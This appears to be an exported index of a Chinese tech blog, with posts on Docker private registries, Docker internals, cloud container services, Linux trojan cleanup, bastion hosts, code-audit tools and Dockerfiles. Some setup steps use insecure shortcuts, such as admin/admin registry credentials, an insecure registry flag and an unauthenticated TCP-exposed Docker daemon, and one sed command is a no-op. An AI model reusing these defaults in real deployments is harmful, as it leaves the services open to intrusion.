    <url>%2F2018%2F08%2F14%2F%E9%85%8D%E7%BD%AE%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93%2F</url>
    <content type="text"><![CDATA[用于 解决公有镜像仓库管理不便; 希望内部用户之间分享镜像，不希望暴露镜像出去的问题 环境：Docker私有仓库：192.168.3.37；客户端：192.168.3.59 安装Docker RegistryDocker Registry工具目前最新为2.0版本，此版本与一些类库，工具一起被打包为负责容器内容分发的工具集Docker Distribution，目前其核心功能组件仍为负责镜像仓库的管理 新版本的Registry基于Golang进行了重构，提供更好的性能和扩展性，并且支持Docker 1.6+的API，非常适合用来构建私有的镜像注册服务器 用户可以通过容器运行和源码安装两种方式来使用Registry 基于容器安装运行搜索镜像1docker search registry 拉取镜像1docker pull docker.io/registry 创建容器123docker run -d -p 5000:5000 --restart always --name registry docker.io/registry--restart：指定容器的重启策略，不能与--rm选项同时使用 1234567Docker容器的重启策略如下： no：默认策略，在容器退出时不重启容器 on-failure：在容器非正常退出时（退出状态非0），才会重启容器 on-failure:3 ：在容器非正常退出时重启容器，最多重启3次 always：在容器退出时总是重启容器 unless-stopped：在容器退出时总是重启容器，但是不考虑在Docker守护进程启动时就已经停止了的容器 验证容器运行访问 1http://IP:5000/v2/ 通过命令，指定本地主机的配置文件Registry默认的配置文件为容器内/etc/docker/registry/config.yml 12345docker run -d -p 5000:5000 \ --restart always \ --name registry \ -v /home/user/registry-conf/config.yml:/etc/docker/registry/config.yml \ docker.io/registry 通过命令，指定本地主机的存储位置Registry默认的存储位置为容器内/var/lib/registry/ 如果容器被删除，则存放于容器中的镜像也会丢失，所以我们一般情况下会指定本地一个目录挂载到容器的/var/lib/registry/下， 这样本地主机与容器内都会存在镜像文件 12345docker run -d -p 5000:5000 \ --restart always \ --name registry \ -v /opt/data/registry:/var/lib/registry/ \ docker.io/registry 配置TLS证书当本地主机运行Registry服务后，所有能访问到该主机的Dockr Host都可以将其当作私有仓库使用。只需要在镜像名称前添加具体的服务器地址 例：将本地的ubuntu:latest镜像上传到私有仓库myrep.com 12docker tag ubuntu myrep.com:5000/ubuntudocker push myrep.com:5000/ubuntu 从私有仓库myrep.com下载镜像到本地 12docker pull myrep.com:5000/ubuntudocker tag myrep.com:5000/ubuntu ubuntu 私有仓库需要启用TLS认证，否则会报错 Docker从1.3.X之后，与docker registry交互默认使用的是https，当搭建的私有仓库只提供http服务时，就会报错。 为了解决这个问题需要客户端启动docker server时增加启动参数为默认使用http访问。 需要客户端在docker的配置文件/etc/sysconfig/docker （ubuntu系统中的docker配置文件是/etc/default/docker ） 添加参数--insecure-registry=192.168.3.37:5000，表示信任私有仓库 1234567vim /etc/sysconfig/dockerOPTIONS=&apos;--selinux-enabled --log-driver=journald&apos;改为OPTIONS=&apos;--selinux-enabled --log-driver=journald --insecure-registry=192.168.3.37:5000&apos; systemctl restart docker 自行生成证书使用openssl生成私人证书文件 一般情况下，证书只支持域名访问，要使其支持IP地址访问，需要修改配置文件openssl.cnf，添加subjectAltName行 1234vim /etc/pki/tls/openssl.cnf[ v3_ca ]subjectAltName = IP:192.168.3.37 # 私有仓库IP 若为自定义域名访问的私有仓库，需要修改客户端hosts文件，将域名与IP关系进行对应 生成自签名证书 12mkdir -p certsopenssl req -newkey rsa:4096 -nodes -sha256 -keyout certs/myrep.key -x509 -days 365 -out certs/myrep.crt 这里的服务器域名写成”192.168.3.37:5000”，后续就使用该地址访问私有仓库。其余项直接回车即可。 生成结果为在certs目录中生成证书文件myrep.crt与密钥文件myrep.key 创建带有TLS认证的Registry容器12345678910docker run \ -d \ -p 192.168.3.37:5000:5000 \ --name myregistry \ --restart=always \ -v /opt/docker/registry/data:/var/lib/registry \ -v /certs:/certs \ -e REGISTRY_HTTP_TLS_CERTIFICATE=/certs/myrep.crt \ -e REGISTRY_HTTP_TLS_KEY=/certs/myrep.key \ docker.io/registry 配置客户端本地主机把registry所在主机上，刚生成的证书：/root/certs/myrep.crt复制到客户端本地主机上的：/etc/docker/certs.d/192.168.3.37:5000/ca.crt 更新CA证书1update-ca-trust 即可对私有仓库进行上传或下载镜像 配置用户认证生成仓库登陆用户密码1mkdir auth docker仓库添加用户的登录用户名和密码 1docker run --entrypoint htpasswd docker.io/registry -Bbn admin admin &gt;&gt; ~/auth/htpasswd 这里设置私有仓库登陆名与密码都为admin 重启docker服务1systemctl restart docker 创建Registry容器(带用户认证与TLS认证)123456789docker run -d -p 5000:5000 --restart=always --name registry \ -v /auth:/auth \ -e &quot;REGISTRY_AUTH=htpasswd&quot; \ -e &quot;REGISTRY_AUTH_HTPASSWD_REALM=Registry Realm&quot; \ -e REGISTRY_AUTH_HTPASSWD_PATH=/auth/htpasswd \ -v /certs:/certs \ -e REGISTRY_HTTP_TLS_CERTIFICATE=/certs/myrep.crt \ -e REGISTRY_HTTP_TLS_KEY=/certs/myrep.key \ docker.io/registry 则客户端需对私有仓库进行docker login登陆后才可进行上传下载操作]]></content>
      <categories>
        <category>Docker技术</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker 核心实现技术]]></title>
    <url>%2F2018%2F08%2F14%2FDocker-%E6%A0%B8%E5%BF%83%E5%AE%9E%E7%8E%B0%E6%8A%80%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[从操作系统功能上看，目前Docker底层依赖的核心技术主要包括Linux操作系统的命名空间(Namespace)，控制组(Control Group)，联合文件系统(Union File System)和Linux网络虚拟化支持 基础架构标准C/S架构 客户端和服务器既可以运行在一个主机上，也可以运行在不同的主机上，通过socket或者RESTful API来进行通信 服务端Docker Daemon一般在宿主机后台运行，作为服务端接收客户端发来的请求，并处理(创建，运行，分发容器) Docker Daemon是一个模块化结构，通过专门的Engine模块来分发管理各个来自客户端的任务 Docker服务端默认监听本地的unix:///var/run/docker.sock套接字，只允许本地的root用户或docker用户组成员访问 可以通过-H选项修改监听的方式 1docker daemon -H IP:PORT 客户端Docker客户端为用户提供一系列可执行命令，用户使用这些命令与Docker daemon交互 客户端发送命令后，等待服务器返回，一旦收到返回后，客户端立即执行结束并退出。用户执行新的命令，需要再次调用客户端命令 同样，客户端默认通过本地的unix:///var/run/docker.sock套接字向服务端发送命令，如果服务端没有监听在默认的地址，则需要客户端在执行命令时显式指定服务端地址 1docker -H tcp://setver_IP:server_PORT command 新的架构设计Docker 1.11.0+中，开始将维护容器运行的任务放到一个单独的组件containerd中来管理，并且支持OCI的runc规范，对客户端API的支持仍然放在Docker Daemon中，通过解耦，大大减少对Docker Daemon的依赖 命名空间命名空间(namespace)是Linux内核的一个强大特性 利用这一特性，每个容器都可以拥有自己单独的命名空间，运行在其中的应用都像是在独立的操作系统环境中一样。 命名空间机制保证了容器之间彼此互不影响 进程命名空间Linux通过命名空间管理进程号，对于同一进程，在不同的命名空间中，看到的进程号不相同，每个进程命名空间有自己的进程号管理方法 进程命名空间是一个父子关系的结构，子空间中的进程对于父空间是可见的。新创建的进程在父命名空间和子命名空间将分别有一个进程号来对应 docker主进程是其创建所有容器的父进程 网络命名空间通过网络命名空间，可以实现网络隔离 网络命名空间为进程提供了一个完全独立的网络协议栈的视图 Docker采用虚拟网络设备(Virtual Network Device)的方式，将不同命名空间的网络设备连接到一起 默认，容器中的虚拟网卡将同本地主机的docker0网桥连接在一起 1brctl show CentOS7 使用 brctl 1yum -y install bridge-utils IPC命名空间容器中进程交互采用Linux常见的进程间交互方法(Interprocess Communication) IPC， PID命名空间与IPC命名空间可以一起使用，同一个IPC命名空间中的进程彼此可见，可进行交互；不同IPC命名空间的进程无法交互 挂载命名空间类似于chroot，将一个进程放到一个特定的目录执行 挂载命名空间允许不同命名空间的进程看到的文件结构不同，这样每个挂载命名空间中的进程所看到的文件目录是彼此隔离的 UTS命名空间UTS(UNIX Time-sharing System)命名空间允许每个容器拥有独立的主机名和域名，从而可以虚拟出一个有独立主机名和网络空间的环境 默认，Docker容器主机名就是返回的容器ID 1docker inspect -f &#123;&#123;&quot;.Config.Hostname&quot;&#125;&#125; container_id 控制组控制组(CGroups)是Linux内核的一个特性，用于对共享资源进行隔离，限制，审计等 控制组提供： 资源限制：设置最大内存限制 优先级：资源分配优先级 资源审计：用来统计系统实际上把多少资源用到合适的目的上，可以使用cpuacct子系统记录某个进程组使用的CPU时间 隔离：为组隔离命名空间 控制：挂起，恢复，重启等操作 可以在创建或启动容器时为每个容器指定资源的限制 12345-c, --cpu-shares int CPU 权重 --cpuset-cpus string 允许使用的CPU数 (0-3, 0,1) --cpuset-mems string 允许使用的MEM数 (0-3, 0,1) -m, --memory string 内存大小 联合文件系统联合文件系统(UnionFS)是一种轻量级的高性能分层文件系统，支持将文件系统中的修改信息作为一次提交，并层层叠加，同时可以将不同目录挂载到同一虚拟文件系统下，应用看到的是最终挂载的结果 联合文件系统是实现Docker镜像的技术基础，Docker镜像可以通过分层来进行继承 Linux网络虚拟化基本原理Docker中的网络接口默认都是虚拟的接口，虚拟接口的最大优势是转发效率极高 Linux通过在内核中进行数据复制来实现虚拟接口之间的数据转发，即发送接口的发送缓存中的数据包将被直接复制到接收接口的接收缓存中，而无需通过外部物理网络设备进行交换。 网络创建过程 创建一对虚拟接口，分别放在本地主机和新容器的命名空间中 本地主机一端的虚拟接口连接到默认的docker0网桥或指定网桥上，并具有以veth开头的唯一名称 容器一端的虚拟接口将放到新创建的容器中，名称为eth0，这个接口只在容器的命名空间可见 从docker0网桥可用地址段中获取一个空闲地址分配给容器的eth0，并配置默认网关为docker0网卡的内部接口的IP地址 用户可以通过使用docker run命令启动容器时，使用--net参数指定容器的网络配置 12345--net=bridge：默认值，在docker0上为容器创建新的网络栈--net=none：将新容器放到隔离的网络栈中，但不进行网络配置--net=container:NAME or ID：将新容器的进程放到一个已存在容器的网络栈中，两个容器仅共享IP地址和端口等网络资源，可通过lo环回接口通信--net=host：不将容器网络放到隔离的命名空间中，即不容器化容器内的网络。容器使用本地主机的网络，拥有完全本地主机接口访问权限--net=user_defined_network：用户自行用network相关命令创建一个网络，将容器连接到指定的已创建网络上去 手动配置网络使用--net=none参数情况 启动容器，指定--net=none参数 1docker run -it --rm --net=none ubuntu /bin/bash 在本地主机查找容器的进程id，并为它创建网络命名空间 123pid=$(docker inspect -f &apos;&#123;&#123;.State.Pid&#125;&#125;&apos; container_id)mkdir -p /var/run/netnsln -s /proc/$pid/ns/net /var/run/netns/$pid 本地主机检查docker0网卡IP和子网掩码信息 1ip addr show docker0 本地主机创建一对veth pair接口A和B，绑定A接口到docker0，并启用 123ip link add A type veth peer name Bbrctl addif docker0 Aip link set A up 本地主机将B接口放到容器的网络命名空间，命名为eth0，启动它并配置一个可用的IP和默认网关 12345ip link set B netns $pidip netns exec $pid ip link set dev B name eth0ip netns exec $pid ip link set eth0 upip netns exec $pid ip addr add 172.17.0.99/16 dev eth0ip netns exec $pid ip route add default via 172.17.0.1 当容器终止后，Docker会清空容器，容器内的网络接口会随网络命名空间一起被清除，A接口也会自动从docker0卸载并清除]]></content>
      <categories>
        <category>Docker技术</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[容器与云服务]]></title>
    <url>%2F2018%2F08%2F14%2F%E5%AE%B9%E5%99%A8%E4%B8%8E%E4%BA%91%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[公有云容器服务公有云(Public Cloud)是标准云计算(Cloud Computing)的一种服务模式。 服务供应商创造公有计算资源，如网络和存储资源。公众与企业通过公共网络获取这些资源。 国内许多公有云厂商，提供可以运行Docker环境的虚拟机，同时一部分公有云厂商已经发布自己的容器服务。 AWS亚马逊公司的IaaS(基础设施即服务)和PaaS(平台即服务)平台服务 2015年AWS发布容器服务(ECS) ECS为Docker提供了一个集群和编排的层，用来控制主机上的容器部署，以及部署之后集群内容器的生命周期管理 ECS是诸如Docker Swarm，Kubernetes，Mesos等工具的替代，它们工作在同一层。 ECS与这些工具不同的地方在于，后者需要用户自己来部署和管理，ECS是“作为服务”来提供的。 Google Cloud PlatformGoogle Cloud Platform(GCP)平台支持App引擎，容器引擎，容器仓库，还支持丰富的数据库，网络，安全，大数据，甚至机器学习产品 Google云平台发布了Google容器引擎 Google容器引擎特性： 自动化容器管理 Google Container Engine 是一个集群管理和编排系统。 此引擎可以按需将Docker容器编排至集群中自动进行，同时可以自定义CPU和内存等配置 此引擎基于Kubernetes，可提供弹性，高可用的云基础服务 分钟级构建集群 用户可以在分钟级别构建完整的集群，包含健康检查，日志服务，以及应用管理系统 弹性与开源 用户可以平滑搭建混合云，也可以平滑迁移系统到云上 Azure微软Azure 2015年，Azure发布了Azure容器服务ACS(Azure Container Service),同时支持Docker Swarm和Apache Mesos集群编排工具 腾讯云2015年，腾讯云支持Docker Machine，并自身定位于Docker基础设施的服务商。同时，腾讯云推出了常用系统的标准版Docker镜像，方便用户创建容器 阿里云阿里云容器服务提供了高性能，可伸缩的容器应用管理服务，支持在一组云服务器上通过Docker容器来进行应用生命周期管理 华为云CCE(Cloud Container Engine)容器引擎，该服务基于以Docker为代表的容器技术，旨在提供从开发，构建，部署/托管，监控，弹性伸缩，故障恢复等全生命周期的一站式解决方案。 通过CCE容器引擎，可以创建自己的私有集群，支持容器集群的全生命周期管理和可视化监控运维。秒级构建不同形态和规模的应用程序，支持应用的弹性伸缩和丰富的监控告警服务 UCloud基础云计算服务提供商 UCloud容器集群服务是可灵活便捷使用的容器服务，资源可分布于多个可用区，具有更高的容灾能力。支持用户自由创建管理，可以灵活绑定一个或多个EIP并具有独立的内网IP及独立的防火墙 容器云服务容器即服务(Contaner as Service,CaaS)可以按需提供容器化环境和应用服务 开发和运维团队通过Docker Registry 相互协作。Registry服务维护一个安全的经过签名的镜像仓库。 开发者可以通过Registry服务将应用镜像拉取至本地，并按自己的意愿构建应用。 当应用通过测试后，开发者将镜像推送至Registry，这样即可保存最新版本的镜像。 应用部署可以完全自动化。 基本要素与关键特性CaaS基本要素 容器调度：调度和管理容器 服务发现：将容器化的服务，注册到服务发现的工具，确保服务间的通信 网络配置：用户可以访问容器，并实现跨主机容器通信 安全配置：只开放容器监听的端口 负载均衡：避免单点过载 数据持久化：容器内数据云端持久化 容错与高可用：日志与管理，容器监控 CaaS关键特性 开发者和运维角色的进一步有机融合 容器化应用程序生命周期的所有阶段 让开发者更加关注构建应用本身，而无需关注运行环境 支持多种底层基础设施，包括多种操作系统和平台 不同服务之间通过API相互调用 阿里云容器服务ACS(Alicloud Container Service,阿里云容器服务) https://help.aliyun.com/product/25972.html?spm=a2c4g.11186623.3.1.S2TCcF]]></content>
      <categories>
        <category>Docker技术</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 木马查杀]]></title>
    <url>%2F2018%2F08%2F13%2FLinux%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80%2F</url>
    <content type="text"><![CDATA[前期准备了解用户业务系统的大概状况：进程名称，文件路径，涉及服务，涉及端口 上传工具上传Linux常用命令工具，不使用感染主机中的命令。 ps，top，netstat，lsof，ls等 查看进程ps查看进程ps aux 查看异常进程 top查看进程通过判断或比对，查看异常进程，使用lsof -p PID查看进程打开的文件 查看非法外连netstat -pantu 查看非法外连端口与地址 查看计划任务crontab -l cat /etc/crontab 目录检查/bin；/sbin，/etc/init.d(启动脚本)… 通过文件存在情况，文件大小，文件时间，文件内容判断是否异常 检查lib库/lib；/usr/lib 检查/tmp 抑制查杀工具：kill，rm，chattr，chmod，ls 停止异常进程 对异常目录上锁：chattr +i DIR 清除清除异常计划任务1chattr -i /etc/ &amp;&amp; vim /etc/crontab &amp;&amp; chattr +i /etc/ 解锁，编辑删除计划任务条目，加锁 命令尽量一条执行完毕 删除计划任务文件删除开机自启异常文件删除其他异常文件删除被篡改的命令和木马目录删除木马主体杀死异常进程 木马清除确认确认文件确认进程 解锁目录确认木马清除完成后解锁目录 文件删除检查查看日志信息查看日志文件是否存在 查看用户名及密码文件木马可能会创建一个新的存放用户名及密码的文件 查看密码文件是否被修改查看最近登录事件lastlog cat /var/log/lastlog 查看当前登陆用户who cat /var/run/utmp 查看登陆过的用户last cat /var/log/wtmp 查看secure安全日志cat /var/log/secure | grep -i &quot;accepted password&quot; 文件恢复当进程打开了某个文件时，只要该进程保持打开该文件，即使将文件删除，此文件仍然会存在于磁盘中。该进程仍然可以对文件进行读写。除该进程外，此文件不可见，因为已经删除了其相应的目录索引节点 /proc目录中的文件不存在于磁盘，而存在于内存 当文件被意外删除，只要还有进程访问此文件，就可以通过lsof命令从/proc目录恢复该文件内容 lsof | grep DATA cat /proc/PID/fd/FILE_NUM &gt; ...]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[运维审计系统（堡垒机）]]></title>
    <url>%2F2018%2F08%2F13%2F%E8%BF%90%E7%BB%B4%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%EF%BC%88%E5%A0%A1%E5%9E%92%E6%9C%BA%EF%BC%89%2F</url>
    <content type="text"><![CDATA[简介运维审计系统（堡垒机）。 即在一个特定的网络环境下，为了保障网络和数据不受来自外部和内部用户的入侵和破坏，而运用各种技术手段实时收集和监控网络环境中每一个组成部分的系统状态、安全事件、网络活动，以便集中报警、及时处理及审计定责。 主要用于服务器、网络设备、安全设备的权限分离和安全管控。 实现价值技术层统一运维入口 统一自然人与主机账号间的权限关系 统一运维操作审计管控点 法规要求《等级保护》，《ISO27000》, 行业标准 功能其从功能上讲，它综合了核心系统运维和安全审计管控两大主干功能，从技术实现上讲，通过切断 终端计算机对网络和服务器资源的直接访问，而采用协议代理的方式，接管了终端计算机对网络和服务器 的访问。 单点登录功能 账号管理 身份认证 资源授权 访问控制 操作审计 部署 jumpserver开源堡垒机介绍Jumpserver 是全球首款完全开源的堡垒机，使用 GNU GPL v2.0 开源协议，是符合 4A 的专业运维审计系统。 Jumpserver 使用 Python / Django 进行开发，遵循 Web 2.0 规范，配备了业界领先的 Web Terminal 解决方案，交互界面美观、用户体验好。 Jumpserver 采纳分布式架构，支持多机房跨区域部署，中心节点提供 API，各机房部署登录节点，可横向扩展、无并发访问限制。 官网：http://www.jumpserver.org/ 1.Jumpserver 现指 Jumpserver 管理后台，是核心组件（Core）, 使用 Django Class Based View 风格开发，支持 Restful API。 2.Coco 实现了 SSH Server 和 Web Terminal Server 的组件，提供 SSH 和 WebSocket 接口, 使用 Paramiko 和 Flask 开发。 3.Luna 现在是 Web Terminal 前端，计划前端页面都由该项目提供，Jumpserver 只提供 API，不再负责后台渲染html等。 4.Guacamole Apache 跳板机项目，Jumpserver 使用其组件实现 RDP 功能，Jumpserver 并没有修改其代码而是添加了额外的插件，支持 Jumpserver 调用。 5.Jumpserver-Python-SDK Jumpserver API Python SDK，Coco 目前使用该 SDK 与 Jumpserver API 交互。 Docker部署Jumpserver 封装了一个 All in one Docker，可以快速启动。该镜像集成了所需要的组件(Windows组件未暂未集成)，也支持使用外置 Database 和 Redis 不建议在生产中使用, 因为所有软件都打包到一个Docker中了，不是Docker最佳实践 快速启动1docker run -d -p 8080:80 -p 2222:2222 registry.jumpserver.org/public/jumpserver:1.0.0 额外环境变量1docker run -d -p 8080:80 -p 2222:2222 -e DB_ENGINE=mysql -e DB_HOST=192.168.1.1 -e DB_PORT=3306 -e DB_USER=root -e DB_PASSWORD=xxx -e DB_NAME=jumpserver registry.jumpserver.org/public/jumpserver:1.0.0 访问浏览器访问: http://&lt;容器所在服务器IP&gt;:8080 SSH访问: ssh -p 2222 &lt;容器所在服务器IP&gt; XShell等工具请添加connection连接 使用http://docs.jumpserver.org/zh/docs/admin_create_asset.html# openldap结合jumpserver]]></content>
      <categories>
        <category>审计</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JAVA 代码审计]]></title>
    <url>%2F2018%2F08%2F12%2FJAVA-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[java准备文档注释（java特有）123456789101112131415161718192021格式：（/**回车） /** *@author 作者 *@version 源文件版本 *@param 方法参数说明信息 */ /** * @author root 作者 E-mail: * @date 创建时间：2018年7月28日 上午10:46:03 * @version 1.0 * @parameter @param mapping * @parameter @param form * @parameter @param request * @parameter @param response * @parameter @return * @parameter @throws Exception * @since * @return */ java语法关键字 保留字 标识符 命名规则： 1.包名 小写 2.类名，接口名 单词首字母大写 3.常量 大写 代码审计源代码审查检查源代码中的缺点和错误信息，分析并找到这些问题引发的安全漏洞，并提供代码修订措施和建议 代码安全性分析输入/输出验证 安全功能 程序异常处理 代码审计思路及流程MVC架构（Model View Controller 模型-视图-控制器） Model：是应用程序中用于处理应用程序数据逻辑的部分 View：是应用程序中处理数据显示的部分 Controller：是应用程序中处理用户交互的部分 MVC设计模式 代码审计方式通读源代码优点 了解程序的架构及业务逻辑 挖掘更高质的漏洞 一般适合企业对自身产品的审计 缺点 耗费时间较多程序比较大 敏感关键字回溯参数优点 可以快速高效的挖出想要漏洞，最常用的方法 判断敏感触发点的位置以及上下文，追踪参数源头 缺点 覆盖不到逻辑漏洞的挖掘 不能了解程序的基本框架 代码审计工具Fortify SCAFortify SCA 是一个静态的、白盒的软件源代码安全测试工具。 它通过内置的五大主要分析引擎：数据流、语义、结构、控制流、配置流等对应用软件的源代码进行静态的分析，分析的过程中与它特有的软件安全漏洞规则集进行全面地匹配、查找，从而将源代码中存在的安全漏洞扫描出来，并给予整理报告。 扫描的结果中不但包括详细的安全漏洞的信息，还会有相关的安全知识的说明，以及修复意见的提供 Seay 傻瓜化的自动审计 。 支持php代码调试 。 函数/变量定位 。 生成审计报告。 自定义审计规则 。 mysql数据库管理 。 黑盒敏感信息泄露一键审计 。 支持正则匹配调试 。 编辑保存文件 。 POST数据包提交 。 RIPSRIPS 是一款基于 PHP 开发的针对 PHP 代码安全审计的软件。 其调用了 PHP 内置解析器接口token_get_all，并且使用Parser做了语法分析，实现了跨文件的变量及函数追踪，扫描结果中非常直观地展示了漏洞形成及变量传递过程，误报率非常低。 RIPS 能够发现 SQL 注入、XSS 跨站、文件包含、代码执行、文件读取等多种漏洞，支持多种样式的代码高亮。它还支持自动生成漏洞利用。]]></content>
      <categories>
        <category>审计</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为Docker镜像添加SSH服务]]></title>
    <url>%2F2018%2F08%2F10%2F%E4%B8%BADocker%E9%95%9C%E5%83%8F%E6%B7%BB%E5%8A%A0SSH%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[当需要远程登陆到容器内进行操作时，需要SSH的支持 基于commit命令创建用于用户提交自己对制定容器的修改，并生成新的镜像 格式：docker commit CONTAINER [REPOSITORY[:TAG]] 准备工作创建容器1docker run -it ubuntu:14.04 /bin/bash 更新apt缓存，并安装openssh-server1apt update &amp;&amp; apt install openssh-server -y 配置SSH服务启动sshd服务12mkdir -p /var/run/sshd/usr/sbin/sshd -D &amp; 修改SSH服务的安全登陆配置，取消pam登陆限制1sed -ri &apos;s#session required pam_loginuid.so#session required pam_loginuid.so#g&apos; /etc/pam.d/sshd 在root目录下创建.ssh目录，并复制需要登录的公钥信息（一般为本地主机用户目录下的.ssh/id_rsa.pub文件，可由ssh-keygen -t rsa命令生成）到.ssh目录下的authorized_keys中123mkdir /root/.sshcd /root/.sshvi /root/.ssh/authorized_keys 创建自启动的SSH服务可执行文件run.sh，并添加可执行权限1234cat run.sh#!/bin/bash/usr/sbin/sshd -D &amp;chmod +x run.sh 退出容器1exit 保存镜像将退出的容器用docker commit命令保存为一个新的sshd:ubuntu镜像1docker commit Container_id sshd:ubuntu 使用镜像启动容器，并添加端口映射，本地主机的10022端口映射到容器的22端口1docker run -d -p 10022:22 sshd:ubuntu /run.sh 在本地主机（10.0.0.31）或其他主机上通过ssh连接本地（10.0.0.31）的10022端口1ssh 10.0.0.31 -p 10022 使用Dockerfile创建使用Dockerfile创建一个支持SSH服务的镜像 创建工作目录创建一个sshd_ubuntu工作目录1mkdir -p sshd_ubuntu 在其中，创建Dockerfile和run.sh文件1cd sshd_ubuntu/ &amp;&amp; touch Dockerfile run.sh 编写run.sh脚本和authorized_keys文件本地主机为Linux系统123cat run.sh #!/bin/bash/usr/sbin/sshd -D &amp; 在本地主机上生成SSH密钥对，并创建authorized_keys文件1ssh-keygen -t rsa 1cat /root/.ssh/id_rsa.pub &gt; ./authorized_keys 编写Dockerfile1234567891011121314151617181920212223# 基础镜像信息FROM ubuntu:14.04# 维护者信息MAINTAINER a a@163.com# 更新apt缓存、安装ssh服务RUN apt update &amp;&amp; apt install -y openssh-serverRUN mkdir -p /var/run/sshd /root/.ssh# 取消pam限制RUN sed -ri &apos;s#session required pam_loginuid.so#session required pam_loginuid.so#g&apos; /etc/pam.d/sshd# 配置免密钥和自启动脚本ADD authorized_keys /root/.ssh/authorized_keysADD run.sh /run.shRUN chmod 755 /run.sh# 开放22端口EXPOSE 22# 设置脚本自启动CMD [&quot;/run.sh&quot;] 创建镜像在sshd_ubuntu目录下1docker build -t sshd:dockerfile . 上面命令最后有一个.，表示使用当前目录中的Dockerfile文件 测试镜像，运行容器1docker run -it -p 10122:22 sshd:dockerfile /bin/bash 本地主机（10.0.0.31）连接新建的ssh容器1ssh 10.0.0.31 -p 10122]]></content>
      <categories>
        <category>Docker技术</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo Admin后台管理博客工具]]></title>
    <url>%2F2018%2F08%2F10%2FHexoAdmin%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%8D%9A%E5%AE%A2%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[使用hexo+github确实非常方便管理自己的知识，但是缺点在于每次在本地使用markdown工具写完笔记，都要进行生成静态页面，然后本地预览或者上传github操作，操作非常繁琐。所以在这里配置使用Hexo Admin工具对博客进行管理，简化操作。 Hexo Admin介绍官方网站：https://jaredforsyth.com/hexo-admin/属于hexo插件系列，使用B/S架构对博客进行后台管理 安装进入/hexo目录 git bash下1npm install --save hexo-admin 访问hexo后台管理界面git bash下1hexo server -d 访问http://localhost:4000/即可访问本地博客 访问http://localhost:4000/admin即可进入Hexo Admin后台管理界面 配置Hexo AdminSettings选项下 点击Setup authentification here 配置你的Hexo Admin登陆账户及密码，以及加密cookies的字符串 下方会生成配置文件字段，将此复制到站点目录下_config.yml中 重启hexo server -d，再次访问http://localhost:4000/admin则需输入账号密码登陆]]></content>
      <categories>
        <category>搭建博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Dockerfile创建镜像]]></title>
    <url>%2F2018%2F08%2F10%2F%E4%BD%BF%E7%94%A8Dockerfile%E5%88%9B%E5%BB%BA%E9%95%9C%E5%83%8F%2F</url>
    <content type="text"><![CDATA[Dockerfile是一个文本格式的配置文件，用户可以使用Dockerfile来快速创建自定义的镜像。 基本结构Dockerfile一般分为四部分：基础镜像信息，维护者信息，镜像操作指令，容器启动时执行指令。 Dockerfile由一行行命令语句组成，并且支持以#开头的注释行。 例子： 1234567891011121314#第一行必须指令基于的基础镜像From ubutu#维护者信息MAINTAINER docker_user docker_user@mail.com#镜像的操作指令apt/sourcelist.listRUN apt update &amp;&amp; apt install -y ngnix RUN echo &quot;\ndaemon off;&quot;&gt;&gt;/etc/ngnix/nignix.conf#容器启动时执行指令CMD /usr/sbin/ngnix 指令说明FROM指定所创建镜像的基础镜像，如果本地不存在，则默认从Docker Hub下载 格式为：FROM &lt;image&gt;或FROM &lt;image&gt;:&lt;tag&gt;或FROM &lt;image&gt;@&lt;digest&gt; 任何Dockerfile中第一条指令必须为FROM指令 若在同一个Dockerfile文件中创建多个镜像，可以使用多个FROM指令（每一个创建镜像使用一次） MAINTAINER指定维护者信息 格式：MAINTAINER &lt;name&gt; 该信息会写入生成镜像的Author属性域中 RUN运行指定命令 格式：RUN &lt;command&gt;或RUN [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;] 前者在shell终端上运行，即/bin/sh -c 后者使用exec运行 ,不会启动shell环境。会被解析为json数组，必须使用双引号。可使用此方法指定使用其他终端类型，例：RUN [&quot;/bin/bash&quot;, &quot;-c&quot;,&quot;echo hello&quot;] 每运行一条RUN指令，镜像就会添加新的一层，并提交 每条run指令在当前基础镜像执行，并且提交新镜像。当命令比较长时，可以使用\换行。 例： 123RUN apt update \ &amp;&amp; apt install -y libbz2-dev \ &amp;&amp; rm -rf /var/cache/apt CMD指定启动容器时默认执行的命令 格式： CMD [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;] 使用exec执行，推荐 CMD command param1 param2 在/bin/sh上执行 ，提供给需要交互的应用 CMD [&quot;Param1&quot;,&quot;param2&quot;] 提供给ENTRYPOINT做默认参数 每个Dockerfile只能执行一条CMD命令，多个CMD命令时，只最后一条被执行。 LABEL指定生成镜像的元数据标签信息 格式：LABEL &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt;... EXPOSE声明镜像内服务所监听的端口 格式：EXPOSE &lt;port&gt; [&lt;port&gt;...] 该命令只起到声明作用，并不会自动完成端口映射。在启动容器时，指定-P或-p参数进行端口映射。 ENV指定环境变量，在镜像生成过程中会被后续RUN指令使用，在镜像启动的容器中也会存在。 格式：ENV &lt;key&gt; &lt;value&gt;或ENV &lt;key&gt;=&lt;value&gt;... 此指令所指定的环境变量在容器运行时可被覆盖掉。如： 1docker run --env &lt;key&gt;=&lt;value&gt; image_name 